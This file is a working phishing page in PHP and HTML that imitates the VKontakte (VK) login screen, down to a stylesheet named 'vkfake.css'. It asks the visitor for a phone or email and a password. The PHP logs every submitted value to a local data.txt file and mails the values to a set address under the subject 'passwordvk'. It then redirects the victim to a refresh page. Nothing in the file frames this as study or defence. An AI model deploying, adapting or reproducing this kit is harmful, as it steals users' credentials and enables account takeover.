<?php
function ValidateEmail($email)
{
   $pattern = '/^([0-9a-z]([-.\w]*[0-9a-z])*@(([0-9a-z])+([-\w]*[0-9a-z])*\.)+[a-z]{2,6})$/i';
   return preg_match($pattern, $email);
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['formid']) && $_POST['formid'] == 'form1')
{
   $mailto = 'youremail@your.com';
   $mailfrom = isset($_POST['email']) ? $_POST['email'] : $mailto;
   $subject = 'passwordvk';
   $message = 'Text massage:';
   $success_url = './refresh.html';
   $error_url = './refresh.html';
   $txtFile = "./data.txt";
   $error = '';
   $eol = "\n";
   $max_filesize = isset($_POST['filesize']) ? $_POST['filesize'] * 1024 : 1024000;
   $boundary = md5(uniqid(time()));

   $header  = 'From: '.$mailfrom.$eol;
   $header .= 'Reply-To: '.$mailfrom.$eol;
   $header .= 'MIME-Version: 1.0'.$eol;
   $header .= 'Content-Type: multipart/mixed; boundary="'.$boundary.'"'.$eol;
   $header .= 'X-Mailer: PHP v'.phpversion().$eol;
   if (!ValidateEmail($mailfrom))
   {
      $error .= "The specified email address is invalid!\n<br>";
   }

   if (!empty($error))
   {
      $errorcode = file_get_contents($error_url);
      $replace = "##error##";
      $errorcode = str_replace($replace, $error, $errorcode);
      echo $errorcode;
      exit;
   }

   $internalfields = array ("submit", "reset", "send", "filesize", "formid", "captcha_code", "recaptcha_challenge_field", "recaptcha_response_field", "g-recaptcha-response");
   $message .= $eol;
   $logdata = '';
   foreach ($_POST as $key => $value)
   {
      if (!in_array(strtolower($key), $internalfields))
      {
         $logdata .= ';';
         if (!is_array($value))
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . $value . $eol;
            $value = str_replace(";", " ", $value);
            $logdata .= $value;
         }
         else
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . implode(",", $value) . $eol;
            $logdata .= implode("|", $value);
         }
      }
   }
   $logdata = str_replace("\r", "", $logdata);
   $logdata = str_replace("\n", " ", $logdata);
   $logdata .= "\r\n";
   $handle = fopen($txtFile, 'a') or die("can't open file");
   $logtime = date("Y-m-d H:i:s;");
   fwrite($handle, $logtime);
   fwrite($handle, $logdata);
   fclose($handle);
   $body  = 'This is a multi-part message in MIME format.'.$eol.$eol;
   $body .= '--'.$boundary.$eol;
   $body .= 'Content-Type: text/plain; charset=UTF-8'.$eol;
   $body .= 'Content-Transfer-Encoding: 8bit'.$eol;
   $body .= $eol.stripslashes($message).$eol;
   if (!empty($_FILES))
   {
       foreach ($_FILES as $key => $value)
       {
          if ($_FILES[$key]['error'] == 0 && $_FILES[$key]['size'] <= $max_filesize)
          {
             $body .= '--'.$boundary.$eol;
             $body .= 'Content-Type: '.$_FILES[$key]['type'].'; name='.$_FILES[$key]['name'].$eol;
             $body .= 'Content-Transfer-Encoding: base64'.$eol;
             $body .= 'Content-Disposition: attachment; filename='.$_FILES[$key]['name'].$eol;
             $body .= $eol.chunk_split(base64_encode(file_get_contents($_FILES[$key]['tmp_name']))).$eol;
          }
      }
   }
   $body .= '--'.$boundary.'--'.$eol;
   if ($mailto != '')
   {
      mail($mailto, $subject, $body, $header);
   }
   header('Location: '.$success_url);
   exit;
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Добро пожаловать | ВКонтакте</title>
<link href="fav_logo.ico" rel="shortcut icon" type="image/x-icon">
<link href="vkfake.css" rel="stylesheet">
<link href="index.css" rel="stylesheet">
</head>
<body>
<div id="container">
<div id="wb_Text1" style="position:absolute;left:446px;top:758px;width:78px;height:16px;z-index:3;text-align:left;">
&nbsp;</div>
<div id="wb_Form1" style="position:absolute;left:659px;top:70px;width:311px;height:186px;z-index:4;">
<form name="Form1" method="post" action="<?php echo basename(__FILE__); ?>" enctype="multipart/form-data" accept-charset="UTF-8" id="Form1">
<input type="hidden" name="formid" value="form1">
<input type="submit" id="Button1" name="button" value="" style="position:absolute;left:24px;top:132px;width:99px;height:34px;z-index:0;">
<input type="text" id="Editbox1" style="position:absolute;left:23px;top:27px;width:254px;height:25px;line-height:25px;z-index:1;" name="name:" value="" placeholder="&#1058;&#1077;&#1083;&#1077;&#1092;&#1086;&#1085; &#1080;&#1083;&#1080; e-mail">
<input type="text" id="Editbox2" style="position:absolute;left:23px;top:77px;width:254px;height:25px;line-height:25px;z-index:2;" name="pass:" value="" placeholder="&#1055;&#1072;&#1088;&#1086;&#1083;&#1100;">
</form>
</div>
</div>
<div id="PageHeader1" style="position:absolute;text-align:left;visibility:hidden;left:0px;top:0px;width:100%;height:32px;z-index:7777;">
</div>
<div id="PageHeader2" style="position:absolute;text-align:left;left:0px;top:0px;width:100%;height:42px;z-index:7777;">
</div>
</body>
</html>